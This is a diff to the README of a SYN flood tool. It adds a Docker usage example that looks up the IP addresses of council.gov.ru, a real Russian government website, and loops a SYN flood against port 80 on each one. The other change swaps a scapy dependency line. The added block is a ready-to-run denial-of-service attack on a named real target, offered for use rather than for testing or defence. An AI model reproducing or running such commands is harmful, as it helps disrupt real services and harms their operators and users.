@@ -10,9 +10,18 @@ You can start SYN Flood attack with this tool.
 
 Simple and efficient.
 
+## TL'DR DOCKER EXAMPLE
+
+```bash
+docker build -t syn-flood:latest -f Dockerfile . --network=host
+
+for ip in $(nslookup council.gov.ru | awk '!/#/{ if ($1 == "Address:") print $2}'); do 
+  docker run syn-flood:latest -t $ip -p 80 -c 5
+done
+```
+
 ## Dependencies
 ```
-apt install python-scapy
 apt install python3-scapy
 ```
 
